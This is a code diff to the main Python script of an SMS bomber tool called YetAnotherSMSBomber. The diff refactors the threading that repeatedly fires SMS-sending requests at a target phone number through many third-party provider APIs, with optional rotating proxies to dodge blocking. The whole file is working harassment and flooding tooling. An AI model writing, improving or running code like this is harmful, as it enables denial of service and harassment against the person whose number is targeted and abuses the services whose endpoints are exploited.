@@ -1,22 +1,8 @@
 #!/usr/bin/env python3
 
-# YetAnotherSMSBomber - A clean, small and powerful SMS bomber script.
-# Copyright (C) 2020 Avinash Reddy <https://github.com/AvinashReddy3108>
-#
-# YetAnotherSMSBomber is free software: you can redistribute it and/or modify
-# it under the terms of the GNU General Public License as published by
-# the Free Software Foundation, either version 3 of the License, or
-# (at your option) any later version.
-#
-# YetAnotherSMSBomber is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-# GNU General Public License for more details.
-#
-# You should have received a copy of the GNU General Public License
-# along with YetAnotherSMSBomber.  If not, see <https://www.gnu.org/licenses/>.
+# SPDX-License-Identifier: GPL-3.0-or-later
 
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from utils import APIRequestsHandler, CustomArgumentParser
 import json
 import requests
@@ -130,30 +116,6 @@ def get_proxy():
 
 proxies = get_proxy() if args.proxy else None
 
-
-# bomber function
-def bomber(p):
-    global failed, success, no_of_sms
-    if not args.verify and p is None or success > no_of_sms:
-        return
-    elif not p.done:
-        try:
-            p.start()
-            if p.status():
-                success += 1
-            else:
-                failed += 1
-        except:
-            failed += 1
-    not args.verbose and not args.verify and print(
-        f"Requests: {success+failed} | Success: {success} | Failed: {failed}",
-        end="\r",
-    )
-    if args.proxy and ((failed) // random.randint(5, 10)) == 0:
-        global proxies
-        proxies = get_proxy()
-
-
 # threadsssss
 start = time.time()
 providers = json.load(open(config, "r", encoding="UTF-8"))["providers"]
@@ -161,35 +123,55 @@ if args.verify:
     pall = [p for x in providers.values() for p in x]
     print(f"Processing {len(pall)} providers, please wait!\n")
     with ThreadPoolExecutor(max_workers=len(pall)) as executor:
+        jobs = []
         for config in pall:
-            executor.submit(
-                bomber,
-                APIRequestsHandler(
+            jobs.append(executor.submit(
+                (
+                    APIRequestsHandler(
+                        target,
+                        proxy=proxies,
+                        verbose=args.verbose,
+                        verify=True,
+                        timeout=args.timeout,
+                        cc=country_code,
+                        config=config,
+                    )
+                ).start),
+            )
+        for job in as_completed(jobs):
+                result = job.result()
+                if result:
+                    success += 1
+                else:
+                    failed += 1
+else:
+    while success < no_of_sms:
+        with ThreadPoolExecutor(max_workers=no_of_threads) as executor:
+            jobs = []
+            for i in range(no_of_sms - success):
+                p = APIRequestsHandler(
                     target,
                     proxy=proxies,
                     verbose=args.verbose,
-                    verify=True,
                     timeout=args.timeout,
                     cc=country_code,
-                    config=config,
-                ),
-            )
-else:
-    with ThreadPoolExecutor(max_workers=no_of_threads) as executor:
-        while success <= no_of_sms:
-            p = APIRequestsHandler(
-                target,
-                proxy=proxies,
-                verbose=args.verbose,
-                timeout=args.timeout,
-                cc=country_code,
-                config=random.choice(
-                    providers[country_code] + providers["multi"]
-                    if country_code in providers
-                    else providers["multi"]
-                ),
-            )
-            executor.submit(bomber, p)
+                    config=random.choice(
+                        providers[country_code] + providers["multi"]
+                        if country_code in providers
+                        else providers["multi"]
+                    ),
+                )
+                jobs.append(executor.submit(p.start))
+            for job in as_completed(jobs):
+                result = job.result()
+                if result:
+                    success += 1
+                else:
+                    failed += 1
+                not args.verbose and print(
+                    f"Requests: {success+failed} | Success: {success} | Failed: {failed}",
+                    end="\r",
+                )
 end = time.time()
 
 # finalize
